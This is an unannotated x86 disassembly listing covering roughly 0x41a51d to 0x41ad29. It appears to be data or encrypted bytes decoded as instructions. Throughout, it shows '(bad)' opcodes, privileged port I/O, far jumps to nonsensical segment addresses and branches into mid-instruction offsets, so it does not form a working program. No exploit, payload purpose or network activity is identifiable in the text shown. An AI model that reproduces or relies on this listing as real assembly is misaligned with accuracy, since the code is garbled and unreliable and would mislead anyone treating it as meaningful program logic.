  41a51d:	(bad)
  41a521:	ffree  st(0)
  41a523:	loopne 0x41a4f3
  41a525:	in     al,dx
  41a526:	mov    ah,0xec
  41a528:	jmp    0xbde9:0x3bdccd7
  41a52f:	aam    0xd4
  41a531:	ret    
  41a532:	(bad)  
  41a533:	(bad)  
  41a535:	fcmovnbe st,st(1)
  41a537:	pop    es
  41a538:	enter  0xffbc,0xe6
  41a53c:	retf   
  41a53d:	or     DWORD PTR [edi-0x37171e28],ebp
  41a543:	ret    
  41a544:	int    0xb0
  41a546:	in     eax,dx
  41a547:	enter  0xf8eb,0xd7
  41a54b:	mov    eax,0xe0f2f5ca
  41a550:	int    0x5
  41a552:	loop   0x41a548
  41a554:	stc    
  41a555:	(bad)  
  41a556:	cld    
  41a557:	out    0xfa,al
  41a559:	out    0xec,al
  41a55b:	retf   
  41a55c:	into   
  41a55d:	leave  
  41a55e:	mov    dl,0xeb
  41a560:	xlat   BYTE PTR ds:[ebx]
  41a561:	in     al,0xf1
  41a563:	mov    esp,0xd9b4b0b1
  41a568:	lods   eax,DWORD PTR ds:[esi]
  41a569:	sti    
  41a56a:	leave  
  41a56b:	mov    eax,0xf9d1dbdd
  41a570:	rcl    edx,0xd1
  41a573:	mov    esp,0x2e4dfb9
  41a578:	in     al,0xce
  41a57a:	enter  0x107,0x6
  41a57e:	lods   al,BYTE PTR ds:[esi]
  41a57f:	out    0xec,eax
  41a581:	mov    esi,0xb6eac2e0
  41a586:	in     al,dx
  41a587:	mov    cl,0xc6
  41a589:	out    dx,al
  41a58a:	repz mov eax,0x7faeae9
  41a590:	cli    
  41a591:	(bad)  
  41a593:	std    
  41a594:	icebp  
  41a595:	loop   0x41a594
  41a597:	mov    DWORD PTR [edi+ecx*1],0xcb0ef9e7
  41a59e:	out    0xcd,al
  41a5a0:	in     eax,dx
  41a5a1:	mov    esp,0xd7b4adeb
  41a5a6:	out    0xb6,eax
  41a5a8:	into   
  41a5a9:	in     eax,dx
  41a5aa:	rcr    eax,cl
  41a5ac:	loop   0x41a583
  41a5ae:	shl    dl,cl
  41a5b0:	aam    0xd8
  41a5b2:	mov    edi,0xe0c30ad0
  41a5b7:	xbegin 0xfc257579
  41a5bd:	repnz out dx,eax
  41a5bf:	(bad)  
  41a5c0:	mul    dh
  41a5c2:	ret    0xccc7
  41a5c5:	in     al,0xc0
  41a5c7:	mov    al,0xd9
  41a5c9:	out    dx,al
  41a5ca:	shr    ebx,cl
  41a5cc:	cli    
  41a5cd:	fistp  QWORD PTR [esp+edx*8-0x63c2501]
  41a5d4:	repnz mov eax,0xffebf8d5
  41a5da:	or     DWORD PTR ds:0xd8ec1201,ecx
  41a5e0:	mov    bl,0xbd
  41a5e2:	icebp  
  41a5e3:	in     eax,0xf3
  41a5e5:	mul    esi
  41a5e7:	in     eax,dx
  41a5e8:	in     eax,0xf3
  41a5ea:	neg    bl
  41a5ec:	int3   
  41a5ed:	add    bh,ch
  41a5ef:	icebp  
  41a5f0:	in     al,dx
  41a5f1:	std    
  41a5f2:	mov    ebx,0xc1f4ebdf
  41a5f7:	aad    0xee
  41a5f9:	(bad)  
  41a5fa:	hlt    
  41a5fb:	fdiv   st(6),st
  41a5fd:	add    bh,bl
  41a5ff:	in     eax,dx
  41a600:	leave  
  41a601:	loopne 0x41a5b1
  41a603:	mov    al,0xc0
  41a605:	(bad)  
  41a606:	call   0xbef95ada
  41a60b:	jmp    0xc0faa313
  41a610:	aad    0xed
  41a612:	sti    
  41a613:	add    edi,edi
  41a615:	sar    edi,0xd4
  41a618:	add    ecx,DWORD PTR ds:0xdc07d9de
  41a61e:	rol    eax,cl
  41a620:	out    dx,al
  41a621:	mov    dl,0xef
  41a623:	aad    0xd0
  41a625:	xlat   BYTE PTR ds:[ebx]
  41a626:	out    0xe7,eax
  41a628:	(bad)  
  41a629:	clc    
  41a62a:	jmp    0x41a5f9
  41a62c:	test   ebx,0xd0ddfdb9
  41a632:	mov    esp,0xe6d1e7d6
  41a637:	fadd   st(6),st
  41a639:	fmul   QWORD PTR [esi]
  41a63b:	out    0xfa,al
  41a63d:	loop   0x41a607
  41a63f:	jecxz  0x41a637
  41a641:	ret    0xd7e3
  41a644:	retf   
  41a645:	repnz in al,0xd7
  41a648:	stc    
  41a649:	push   DWORD PTR [esi-0x10b1709]
  41a64f:	mov    edx,0xe602d9be
  41a654:	(bad)  
  41a656:	clc    
  41a657:	aad    0xd9
  41a659:	mov    esp,0xf8cecdee
  41a65e:	ret    0xe1f3
  41a661:	out    dx,al
  41a662:	repnz mov cl,0xb0
  41a665:	loop   0x41a62f
  41a667:	shl    DWORD PTR [esi-0x28012616],1
  41a66d:	add    al,BYTE PTR [eax]
  41a66f:	loope  0x41a665
  41a671:	ret    0xd3e4
  41a674:	or     bh,al
  41a676:	aam    0xe6
  41a678:	fnstsw WORD PTR [esi+ecx*8-0x36181615]
  41a67f:	fucom  st(6)
  41a681:	jecxz  0x41a64c
  41a683:	jecxz  0x41a64c
  41a685:	mov    ebx,0xfbf9d8d8
  41a68a:	out    dx,eax
  41a68b:	into   
  41a68c:	lock add esi,ecx
  41a68f:	clc    
  41a690:	repnz clc 
  41a692:	(bad)  
  41a693:	fcmovu st,st(7)
  41a695:	aam    0xc1
  41a697:	loope  0x41a69f
  41a699:	(bad)  
  41a69b:	jmp    0xd5af:0xafadfcf9
  41a6a2:	out    0xe8,al
  41a6a4:	jmp    0xd2fc9f5f
  41a6a9:	jmp    0xddc1:0xe2fac8c8
  41a6b0:	jecxz  0x41a6ad
  41a6b2:	out    0xfb,al
  41a6b4:	fadd   DWORD PTR [edx]
  41a6b6:	icebp  
  41a6b7:	(bad)  
  41a6b8:	push   cs
  41a6b9:	cld    
  41a6ba:	jmp    0xe7f2:0xc8e306c4
  41a6c1:	jecxz  0x41a698
  41a6c3:	enter  0xf2e4,0xba
  41a6c7:	mov    ch,0xb5
  41a6c9:	in     al,dx
  41a6ca:	jmp    0x41a6a0
  41a6cc:	repz mov ecx,0xf8d2c300
  41a6d2:	(bad)  
  41a6d4:	idiv   ch
  41a6d6:	fsubrp st(2),st
  41a6d8:	(bad)  
  41a6d9:	call   0x4158bca
  41a6de:	in     eax,dx
  41a6df:	out    dx,al
  41a6e0:	into   
  41a6e1:	jecxz  0x41a6a7
  41a6e3:	call   0xfb1b92d6
  41a6e8:	cli    
  41a6e9:	jmp    0xd62fa5c6
  41a6ee:	jecxz  0x41a6af
  41a6f0:	ret    
  41a6f1:	add    eax,0x6d6d5d6
  41a6f6:	test   cl,0xbd
  41a6f9:	into   
  41a6fa:	jmp    0xeeea:0xf0090402
  41a701:	jmp    0x41a6d7
  41a703:	lods   al,BYTE PTR ds:[esi]
  41a704:	cli    
  41a705:	mov    cl,0xb2
  41a707:	mov    ebx,0xd5ddf6e4
  41a70c:	ret    
  41a70d:	fcmovnb st,st(3)
  41a70f:	call   0xd73e7908
  41a714:	shr    edx,0xdf
  41a717:	sar    BYTE PTR [ebp-0x3bfb121f],1
  41a71d:	or     ch,BYTE PTR [edi-0x163b5138]
  41a723:	repz in al,dx
  41a725:	mov    al,0xf7
  41a727:	clc    
  41a728:	mov    cl,0xf4
  41a72a:	repnz int3 
  41a72c:	clc    
  41a72d:	int    0xee
  41a72f:	(bad)  
  41a731:	mov    esi,0xd6c2f705
  41a736:	add    eax,0xe20eddfe
  41a73b:	adc    esp,edx
  41a73d:	fld    st(0)
  41a73f:	faddp  st(3),st
  41a741:	lods   al,BYTE PTR ds:[esi]
  41a742:	mov    bh,0xd0
  41a744:	aad    0xc4
  41a746:	mov    cl,0xd0
  41a748:	int    0xdb
  41a74a:	mov    ebx,0xd7d8f7bc
  41a74f:	loopne 0x41a731
  41a751:	rcr    ecx,cl
  41a753:	(bad)
  41a758:	out    dx,al
  41a759:	leave  
  41a75a:	out    dx,eax
  41a75b:	aam    0xc5
  41a75d:	bswap  esp
  41a75f:	ror    esi,1
  41a761:	int    0xf7
  41a763:	retf   0xc5d5
  41a766:	mov    ch,0xd8
  41a768:	cli    
  41a769:	std    
  41a76a:	mov    esi,0xee02f5fc
  41a76f:	fdivr  st,st(2)
  41a771:	out    dx,al
  41a772:	xlat   BYTE PTR ds:[ebx]
  41a773:	add    ebx,esp
  41a775:	in     al,0xdf
  41a777:	retf   0xfde2
  41a77a:	push   cs
  41a77b:	add    dl,BYTE PTR [edx]
  41a77d:	loope  0x41a744
  41a77f:	jecxz  0x41a73f
  41a781:	lods   al,BYTE PTR ds:[esi]
  41a782:	idiv   BYTE PTR [edx+esi*4-0x4f172e13]
  41a789:	in     al,0xca
  41a78b:	rcr    ecx,cl
  41a78d:	fsubrp st(0),st
  41a78f:	add    ebx,ebx
  41a791:	fdivrp st(2),st
  41a793:	cld    
  41a794:	fmul   st(3),st
  41a796:	shl    edx,0xca
  41a799:	out    dx,al
  41a79a:	fucom  st(4)
  41a79c:	or     bh,bh
  41a79e:	jecxz  0x41a769
  41a7a0:	fdiv   QWORD PTR [esi-0x4a121320]
  41a7a6:	aam    0xc4
  41a7a8:	enter  0xcecb,0xc9
  41a7ac:	jmp    0xe11c81a0
  41a7b1:	mov    ebp,0xdcffd9f2
  41a7b6:	jmp    0x41a7b6
  41a7b8:	fucomip st,st(2)
  41a7ba:	into   
  41a7bb:	or     bl,cl
  41a7bd:	iret   
  41a7be:	(bad)  
  41a7c0:	test   bl,0xdd
  41a7c3:	cmc    
  41a7c4:	out    dx,eax
  41a7c5:	int3   
  41a7c6:	mov    dh,0xe6
  41a7c8:	hlt    
  41a7c9:	fidivr DWORD PTR [edi-0x26092513]
  41a7cf:	out    dx,eax
  41a7d0:	stc    
  41a7d1:	out    0xe0,al
  41a7d3:	loope  0x41a7ab
  41a7d5:	cli    
  41a7d6:	aad    0xef
  41a7d8:	(bad)  
  41a7d9:	(bad)  
  41a7da:	(bad)  
  41a7db:	fsub   st(5),st
  41a7dd:	cld    
  41a7de:	mov    ecx,0xb0acacc5
  41a7e3:	jecxz  0x41a7c0
  41a7e5:	mov    bh,0xfa
  41a7e7:	(bad)
  41a7ea:	mov    bh,0xe3
  41a7ec:	sar    ecx,1
  41a7ee:	int3   
  41a7ef:	xlat   BYTE PTR ds:[ebx]
  41a7f0:	fadd   QWORD PTR [ebx]
  41a7f2:	push   es
  41a7f3:	loope  0x41a7dc
  41a7f5:	in     eax,0xe5
  41a7f7:	add    dh,ch
  41a7f9:	les    eax,FWORD PTR [edi]
  41a7fb:	loope  0x41a7cb
  41a7fd:	repz mov esi,0xf7c4cbf7
  41a803:	stos   BYTE PTR es:[edi],al
  41a804:	ret    
  41a805:	shl    dh,0xb2
  41a808:	hlt    
  41a809:	mov    edx,0xd1b9b9da
  41a80e:	mov    edi,0xfee7d2fe
  41a813:	or     ecx,ebx
  41a815:	dec    BYTE PTR [ebx]
  41a817:	add    esp,edx
  41a819:	(bad)  
  41a81a:	fucomp st(3)
  41a81c:	or     cl,BYTE PTR [ecx]
  41a81e:	in     al,0xc2
  41a820:	enter  0xc9e6,0xef
  41a824:	leave  
  41a825:	repz jmp 0x41a7e2
  41a828:	rcl    ecx,1
  41a82a:	mov    bl,0xcd
  41a82c:	lock mov al,0xc8
  41a82f:	div    ecx
  41a831:	add    DWORD PTR [esi+edx*8],eax
  41a834:	fdivp  st(3),st
  41a836:	idiv   bl
  41a838:	jmp    0x41a80f
  41a83a:	in     eax,0xc5
  41a83c:	ror    DWORD PTR [edx],0xe9
  41a83f:	scas   eax,DWORD PTR es:[edi]
  41a840:	jmp    0xdae9:0xf6b1e3dc
  41a847:	out    0xcf,al
  41a849:	fsubr  st,st(6)
  41a84b:	fdivp  st(5),st
  41a84d:	lock mov ebx,0xd8edcefb
  41a853:	div    al
  41a855:	(bad)  
  41a856:	add    cl,cl
  41a858:	cmc    
  41a859:	or     ecx,edi
  41a85b:	leave  
  41a85c:	or     ebp,ebp
  41a85e:	repz out dx,eax
  41a860:	mov    dl,0xec
  41a862:	icebp  
  41a863:	out    dx,eax
  41a864:	in     eax,dx
  41a865:	repz out dx,eax
  41a867:	out    dx,al
  41a868:	mov    ebx,0xb9eab7cf
  41a86d:	sar    BYTE PTR [esi-0x1b0211ff],cl
  41a873:	fsubrp st(6),st
  41a875:	(bad)  
  41a876:	mov    edi,0xd4d605fc
  41a87b:	or     eax,0xaacd09c9
  41a880:	lock ret 0xe2e4
  41a884:	(bad)
  41a887:	out    dx,al
  41a888:	mov    ecx,0xf9d5eee9
  41a88d:	cld    
  41a88e:	ret    0xb5d0
  41a891:	mov    ebp,0xfadffbf9
  41a896:	or     al,dh
  41a898:	fisttp DWORD PTR ds:0xe6f308c5
  41a89e:	lods   al,BYTE PTR ds:[esi]
  41a89f:	shr    DWORD PTR [ecx-0x134c2a49],cl
  41a8a5:	loop   0x41a870
  41a8a7:	sti    
  41a8a8:	mov    ebx,0xf2b9fad6
  41a8ad:	repz call 0xc6429c96
  41a8b3:	cld    
  41a8b4:	loope  0x41a89f
  41a8b6:	in     eax,0xc7
  41a8b8:	or     cl,ch
  41a8ba:	leave  
  41a8bb:	jmp    0xd5e8:0xd3d0f109
  41a8c2:	mov    dh,0xd0
  41a8c4:	mov    dl,0xf2
  41a8c6:	rcr    ebx,cl
  41a8c8:	mov    ecx,0xe3f3b5b8
  41a8cd:	test   DWORD PTR [edx],0xbff2fdff
  41a8d3:	std    
  41a8d4:	add    bh,al
  41a8d6:	add    eax,0xfac8e4e2
  41a8db:	cli    
  41a8dc:	stc    
  41a8dd:	jecxz  0x41a8a3
  41a8df:	fsubrp st(3),st
  41a8e1:	les    esi,FWORD PTR [esi-0x4f12340f]
  41a8e7:	out    dx,al
  41a8e8:	(bad)  
  41a8e9:	mov    ecx,0xcdeae9f9
  41a8ee:	(bad)  
  41a8f0:	iret   
  41a8f1:	int3   
  41a8f2:	(bad)  
  41a8f4:	push   es
  41a8f5:	(bad)
  41a8f8:	shl    dh,0x8
  41a8fb:	add    al,ah
  41a8fd:	push   cs
  41a8fe:	icebp  
  41a8ff:	scas   eax,DWORD PTR es:[edi]
  41a900:	lods   al,BYTE PTR ds:[esi]
  41a901:	shr    BYTE PTR [ebx-0x491e3240],0xd5
  41a908:	(bad)  
  41a90a:	(bad)
  41a90d:	icebp  
  41a90e:	(bad)  
  41a910:	xlat   BYTE PTR ds:[ebx]
  41a911:	repnz fcmovnu st,st(7)
  41a914:	stc    
  41a915:	loopne 0x41a8fa
  41a917:	push   es
  41a918:	shufps xmm2,xmm4,0xe
  41a91c:	or     bh,ch
  41a91e:	test   al,0xbc
  41a920:	(bad)  
  41a921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a922:	repz in al,0xca
  41a925:	(bad)  
  41a926:	in     eax,dx
  41a927:	rcl    dl,1
  41a929:	out    0xdc,al
  41a92b:	cli    
  41a92c:	in     eax,dx
  41a92d:	aam    0xe0
  41a92f:	repnz loope 0x41a922
  41a932:	cld    
  41a933:	ret    
  41a934:	(bad)  
  41a935:	lock jmp 0x41a917
  41a938:	(bad)
  41a93b:	(bad)  
  41a93e:	fsub   QWORD PTR [esi-0xa3a282f]
  41a944:	lock test al,0xcc
  41a947:	in     al,0xf8
  41a949:	in     eax,0xb5
  41a94b:	(bad)  
  41a94c:	out    dx,eax
  41a94d:	into   
  41a94e:	sti    
  41a94f:	repnz mov ch,0xc2
  41a952:	fcmovnb st,st(4)
  41a954:	add    eax,0xdfd0f8fa
  41a959:	add    eax,ecx
  41a95b:	in     eax,0xf8
  41a95d:	in     al,0xc0
  41a95f:	fadd   st(2),st
  41a961:	out    dx,al
  41a962:	in     eax,dx
  41a963:	retf   0xc7ac
  41a966:	sti    
  41a967:	fmul   st,st(0)
  41a969:	xlat   BYTE PTR ds:[ebx]
  41a96a:	fmul   st,st(5)
  41a96c:	mov    esi,0xc3fcdff6
  41a971:	jecxz  0x41a932
  41a973:	out    0xe2,al
  41a975:	(bad)  
  41a976:	retf   
  41a977:	inc    DWORD PTR [edi]
  41a979:	or     eax,DWORD PTR [eiz*8-0x4c3c12f9]
  41a980:	out    dx,al
  41a981:	call   0xc8268c51
  41a986:	mov    al,0xeb
  41a988:	in     eax,0xb9
  41a98a:	lock mov edx,0xd1f8b802
  41a990:	(bad)  
  41a992:	fdivr  st(3),st
  41a994:	icebp  
  41a995:	in     eax,0xc6
  41a997:	(bad)
  41a99b:	add    eax,0xaab1cfcb
  41a9a0:	(bad)  
  41a9a1:	aad    0xd6
  41a9a3:	(bad)  
  41a9a4:	in     al,0xda
  41a9a6:	fdivr  DWORD PTR [eax-0x27130612]
  41a9ac:	mov    edx,0xe1c8b8f5
  41a9b1:	loop   0x41a9a5
  41a9b3:	shl    ah,0xf2
  41a9b6:	add    eax,0xffee02d7
  41a9bb:	or     eax,0xceb3d2f3
  41a9c0:	into   
  41a9c1:	jecxz  0x41a997
  41a9c3:	aam    0xef
  41a9c5:	in     al,0xe6
  41a9c7:	retf   
  41a9c8:	sar    BYTE PTR [edi-0x17262f18],1
  41a9ce:	fdivr  QWORD PTR [edi+0x6dbdad9]
  41a9d4:	mov    esp,0xf4cbd5dd
  41a9d9:	loop   0x41a9c1
  41a9db:	add    ecx,eax
  41a9dd:	icebp  
  41a9de:	out    dx,eax
  41a9df:	lods   eax,DWORD PTR ds:[esi]
  41a9e0:	jmp    0xc23379cb
  41a9e5:	ror    esp,0xcd
  41a9e8:	jmp    0xc0149bb1
  41a9ed:	shl    BYTE PTR [edi-0x2021232d],cl
  41a9f3:	add    edi,eax
  41a9f5:	(bad)
  41a9f8:	ror    bl,0xf5
  41a9fb:	out    0xd9,al
  41a9fd:	stc    
  41a9fe:	fdiv   QWORD PTR [eax-0x3a285334]
  41aa04:	sar    ebx,1
  41aa06:	leave  
  41aa07:	retf   
  41aa08:	fmul   st,st(0)
  41aa0a:	jmp    0x41a9f5
  41aa0c:	out    dx,eax
  41aa0d:	mov    edi,0xe3f6dbbc
  41aa12:	mov    edx,0xe706f4d6
  41aa18:	rol    BYTE PTR [ebx],0xc9
  41aa1b:	clc    
  41aa1c:	out    dx,eax
  41aa1d:	(bad)  
  41aa1e:	mov    ecx,0xf3eae1d8
  41aa23:	in     eax,dx
  41aa24:	ret    
  41aa25:	out    0xb9,eax
  41aa27:	in     al,dx
  41aa28:	aad    0xce
  41aa2a:	mov    bh,0xbc
  41aa2c:	mov    edi,0xfab9d3fb
  41aa31:	ret    0xe304
  41aa34:	mov    ebp,0x3c4c1d7
  41aa39:	or     ebp,eax
  41aa3b:	iret   
  41aa3c:	cli    
  41aa3d:	into   
  41aa3e:	(bad)  
  41aa3f:	out    0xe8,eax
  41aa41:	enter  0xcdcd,0xf7
  41aa45:	shl    ah,0xb9
  41aa48:	test   dh,0xda
  41aa4b:	ror    edx,1
  41aa4d:	sar    BYTE PTR [eax+0x6f2f7],1
  41aa53:	aam    0xf4
  41aa55:	(bad)  
  41aa57:	pop    es
  41aa58:	lds    eax,FWORD PTR [esi+ecx*8]
  41aa5b:	add    cl,ch
  41aa5d:	loope  0x41aa0d
  41aa5f:	test   al,0xcd
  41aa61:	scas   al,BYTE PTR es:[edi]
  41aa62:	mul    ch
  41aa64:	lds    esi,FWORD PTR [ecx-0x22164b4a]
  41aa6a:	mov    esi,0xf3b8d5ef
  41aa6f:	mov    ebp,0xc5e5d3bf
  41aa74:	rcl    ebp,cl
  41aa76:	or     edi,DWORD PTR [esi-0x510431b]
  41aa7c:	(bad)  
  41aa7d:	leave  
  41aa7e:	loop   0x41aa42
  41aa80:	(bad)  
  41aa81:	out    0xc5,al
  41aa83:	fcmovnbe st,st(4)
  41aa85:	loope  0x41aa73
  41aa87:	sti    
  41aa88:	mov    bh,0xfb
  41aa8a:	int3   
  41aa8b:	imul   esi
  41aa8d:	jmp    0xe7487964
  41aa92:	mov    edi,0x807dffe
  41aa97:	aam    0xdb
  41aa99:	jecxz  0x41aa9a
  41aa9b:	fmul   st,st(2)
  41aa9d:	jmp    0xeb088a6f
  41aaa2:	aad    0xc3
  41aaa4:	out    dx,eax
  41aaa5:	mov    cl,0xce
  41aaa7:	xlat   BYTE PTR ds:[ebx]
  41aaa8:	mov    eax,0xbdcab8cd
  41aaad:	loope  0x41aa90
  41aaaf:	fprem1 
  41aab1:	inc    edx
  41aab3:	loope  0x41aab4
  41aab5:	rcr    edi,1
  41aab7:	(bad)  
  41aab8:	out    dx,eax
  41aab9:	add    edi,ecx
  41aabb:	or     al,0xd3
  41aabd:	adc    DWORD PTR [edi-0x4d433448],esp
  41aac3:	iret   
  41aac4:	not    ah
  41aac6:	sti    
  41aac7:	in     al,0xcf
  41aac9:	in     eax,0xf1
  41aacb:	repz in eax,dx
  41aacd:	fdivr  DWORD PTR [eax-0x1a210410]
  41aad3:	mul    bl
  41aad5:	(bad)  
  41aad6:	stc    
  41aad7:	add    bl,dh
  41aad9:	fxch   st(6)
  41aadb:	enter  0xdfce,0xc2
  41aadf:	stos   BYTE PTR es:[edi],al
  41aae0:	mov    edi,0xd6b2bdf3
  41aae5:	stc    
  41aae6:	icebp  
  41aae7:	icebp  
  41aae8:	into   
  41aae9:	fdiv   st,st(2)
  41aaeb:	shl    bl,1
  41aaed:	repz sti 
  41aaef:	div    ebp
  41aaf1:	cli    
  41aaf2:	std    
  41aaf3:	push   eax
  41aaf5:	repnz (bad) 
  41aaf8:	leave  
  41aaf9:	call   0xe34787fb
  41aafe:	(bad)
  41ab01:	lods   eax,DWORD PTR ds:[esi]
  41ab02:	out    dx,eax
  41ab03:	fadd   st(3),st
  41ab05:	int    0xfa
  41ab07:	(bad)  
  41ab08:	lods   eax,DWORD PTR ds:[esi]
  41ab09:	push   esp
  41ab0b:	out    dx,eax
  41ab0c:	mul    edx
  41ab0e:	in     eax,dx
  41ab0f:	add    dl,ah
  41ab11:	rcl    ch,1
  41ab13:	repnz fisttp DWORD PTR [ecx]
  41ab16:	push   es
  41ab17:	jecxz  0x41ab0f
  41ab19:	push   cs
  41ab1a:	out    0xce,al
  41ab1c:	add    esp,esp
  41ab1e:	jmp    0xcc0f96d1
  41ab23:	div    BYTE PTR [edi-0x3b46124e]
  41ab29:	std    
  41ab2a:	mov    ah,0xed
  41ab2c:	retf   0xf2f6
  41ab2f:	mov    esp,0x1f405be
  41ab34:	out    0xd5,al
  41ab36:	fsub   st,st(2)
  41ab38:	loopne 0x41ab3a
  41ab3a:	push   cs
  41ab3b:	(bad)  
  41ab3c:	or     ebp,esp
  41ab3e:	in     eax,0xd3
  41ab40:	les    ebp,FWORD PTR [ebp-0x1d4b0a2a]
  41ab46:	mov    al,0xef
  41ab48:	mov    bh,0xb8
  41ab4a:	aam    0xd4
  41ab4c:	shl    esp,1
  41ab4e:	cld    
  41ab4f:	int    0xd4
  41ab51:	int3   
  41ab52:	in     al,dx
  41ab53:	(bad)  
  41ab56:	or     edi,esp
  41ab58:	fld    DWORD PTR [edi]
  41ab5a:	add    edi,esi
  41ab5c:	or     al,0xc8
  41ab5e:	in     eax,dx
  41ab5f:	rcl    dh,1
  41ab61:	in     eax,dx
  41ab62:	ret    0xb5cf
  41ab65:	cli    
  41ab66:	shr    ebx,0xb1
  41ab69:	(bad)  
  41ab6a:	fsubp  st(6),st
  41ab6c:	(bad)  
  41ab6e:	rol    DWORD PTR [ebx],1
  41ab70:	jecxz  0x41ab4c
  41ab72:	aam    0xc5
  41ab74:	shl    ch,0xd4
  41ab77:	sti    
  41ab78:	mov    DWORD PTR [ebx+eax*1],0xadd30ac2
  41ab7f:	mov    edi,0xcbbdbcc7
  41ab84:	lods   al,BYTE PTR ds:[esi]
  41ab85:	ret    0xd4ec
  41ab88:	iret   
  41ab89:	(bad)  
  41ab8b:	mov    ebp,0xf7c8f6d1
  41ab90:	inc    al
  41ab92:	dec    esp
  41ab94:	mov    ecx,0x9cb00f8
  41ab99:	cmc    
  41ab9a:	(bad)  
  41ab9c:	bswap  ecx
  41ab9e:	(bad)
  41aba1:	mov    dl,0xec
  41aba3:	int3   
  41aba4:	(bad)  
  41aba5:	loope  0x41ab6e
  41aba7:	cmc    
  41aba8:	retf   0xd1e8
  41abab:	in     eax,dx
  41abac:	repnz fidivr WORD PTR [edx-0x809fc0a]
  41abb3:	repnz out 0xfd,al
  41abb6:	mul    esi
  41abb8:	fnclex 
  41abba:	or     ecx,esi
  41abbc:	add    al,0xfd
  41abbe:	int    0xbe
  41abc0:	rcr    dh,1
  41abc2:	(bad)
  41abc5:	mov    ah,0xd1
  41abc7:	aad    0xfe
  41abc9:	retf   
  41abca:	enter  0xf6ec,0xea
  41abce:	(bad)  
  41abd0:	mov    ebp,0xd8e1fedc
  41abd5:	add    ecx,ebp
  41abd7:	fcmove st,st(7)
  41abd9:	or     eax,0xffeacefe
  41abde:	ret    0xdfe9
  41abe1:	(bad)  
  41abe2:	mov    dl,0xe7
  41abe4:	retf   
  41abe5:	out    0xc7,al
  41abe7:	retf   
  41abe8:	repnz into 
  41abea:	out    dx,eax
  41abeb:	repz (bad) 
  41abee:	(bad)  
  41abef:	(bad)  
  41abf1:	aad    0xf9
  41abf3:	int3   
  41abf4:	xlat   BYTE PTR ds:[ebx]
  41abf5:	stc    
  41abf6:	fiadd  DWORD PTR [ebx]
  41abf8:	add    al,0x6
  41abfa:	fdivr  st(4),st
  41abfc:	leave  
  41abfd:	or     eax,0xc5c8cbaf
  41ac02:	rol    ecx,0xce
  41ac05:	repnz sar bl,cl
  41ac08:	idiv   DWORD PTR [esi-0x1131322c]
  41ac0e:	stc    
  41ac0f:	ret    0xcddf
  41ac12:	lds    eax,FWORD PTR [esi]
  41ac14:	cli    
  41ac15:	loopne 0x41abfb
  41ac17:	sti    
  41ac18:	(bad)  
  41ac1a:	clc    
  41ac1b:	ret    0xc9e5
  41ac1e:	fxch   st(0)
  41ac20:	(bad)  
  41ac21:	retf   0xdcf2
  41ac24:	test   eax,0xf4c7d1f6
  41ac29:	test   dh,0xf8
  41ac2c:	(bad)  
  41ac2e:	rcr    esp,0xc2
  41ac31:	mov    edi,0xeaf9f3f4
  41ac36:	rcr    eax,1
  41ac38:	enter  0xeeed,0xe2
  41ac3c:	push   es
  41ac3d:	std    
  41ac3e:	shl    DWORD PTR [ebx-0x1d113c0e],1
  41ac44:	ret    
  41ac45:	shr    bh,1
  41ac47:	sti    
  41ac48:	repnz jmp 0xd0d4:0xdafdb5f2
  41ac50:	sar    DWORD PTR [eax-0x1c26f802],1
  41ac56:	fdiv   st(4),st
  41ac58:	hlt    
  41ac59:	loopne 0x41ac53
  41ac5b:	(bad)  
  41ac5d:	adc    esi,edx
  41ac5f:	mov    dl,0xcc
  41ac61:	jmp    0x41ac34
  41ac63:	in     eax,dx
  41ac64:	leave  
  41ac65:	leave  
  41ac66:	repnz xlat BYTE PTR ds:[ebx]
  41ac68:	mov    edi,0xe2bff2b4
  41ac6d:	sar    eax,cl
  41ac6f:	cli    
  41ac70:	(bad)  
  41ac71:	(bad)  
  41ac72:	stc    
  41ac73:	or     ebp,ebx
  41ac75:	jmp    0xb3c7762
  41ac7a:	leave  
  41ac7b:	jecxz  0x41ac87
  41ac7d:	add    al,0xcb
  41ac7f:	shr    eax,cl
  41ac81:	rol    eax,0xeb
  41ac84:	not    dh
  41ac86:	in     eax,0xc0
  41ac88:	in     al,dx
  41ac89:	not    cl
  41ac8b:	mov    ecx,0xd5d1cfed
  41ac90:	hlt    
  41ac91:	mov    edi,0xd1c2ebd0
  41ac96:	retf   
  41ac97:	lock retf 0xe8e0
  41ac9b:	adc    eax,ecx
  41ac9d:	(bad)  
  41ac9e:	scas   al,BYTE PTR es:[edi]
  41ac9f:	les    esi,FWORD PTR [ecx-0x3e230d30]
  41aca5:	(bad)  
  41aca6:	aam    0xc4
  41aca8:	mov    ch,0xcc
  41acaa:	idiv   bh
  41acac:	fdivrp st(1),st
  41acae:	jmp    0xe7006aa9
  41acb3:	(bad)  
  41acb4:	aam    0x6
  41acb6:	add    DWORD PTR [eax],ecx
  41acb8:	(bad)  
  41acba:	out    0xcf,al
  41acbc:	add    cl,ah
  41acbe:	(bad)  [edx-0x35131f43]
  41acc4:	mov    bl,0xe1
  41acc6:	into   
  41acc7:	icebp  
  41acc8:	in     al,0xba
  41acca:	enter  0xdcd4,0xfb
  41acce:	xlat   BYTE PTR ds:[ebx]
  41accf:	out    dx,eax
  41acd0:	push   es
  41acd1:	rcr    ah,1
  41acd3:	aad    0xd3
  41acd5:	aam    0xc1
  41acd7:	std    
  41acd8:	cmc    
  41acd9:	fild   DWORD PTR [esi]
  41acdb:	in     eax,dx
  41acdc:	call   DWORD PTR [ebx]
  41acde:	jmp    0x41ac8a
  41ace0:	iret   
  41ace1:	aad    0xcb
  41ace3:	call   0xe9f683b9
  41ace8:	aam    0xb8
  41acea:	std    
  41aceb:	idiv   dh
  41aced:	int3   
  41acee:	fcom   st(1)
  41acf0:	stc    
  41acf1:	ret    
  41acf2:	vshufpd xmm0,xmm3,XMMWORD PTR [edi],0xa
  41acf7:	xadd   BYTE PTR [ecx],al
  41acfa:	dec    edi
  41acfc:	lds    eax,FWORD PTR [edx]
  41acfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acff:	ret    
  41ad00:	jmp    0x41acd7
  41ad02:	iret   
  41ad03:	int3   
  41ad04:	test   eax,0xf2d7ccf5
  41ad09:	les    edi,FWORD PTR [ecx-0x13fd424b]
  41ad0f:	(bad)  
  41ad10:	fdivr  DWORD PTR [esi-0x2efc0e1c]
  41ad16:	(bad)  
  41ad18:	std    
  41ad19:	or     ah,bl
  41ad1b:	fild   WORD PTR ds:0xcccee9c0
  41ad21:	out    dx,eax
  41ad22:	repnz mov ah,0xb3
  41ad25:	retf   0xc5b2
  41ad28:	into   
  41ad29:	jmp    0xddf4:0xc8b5f6eb
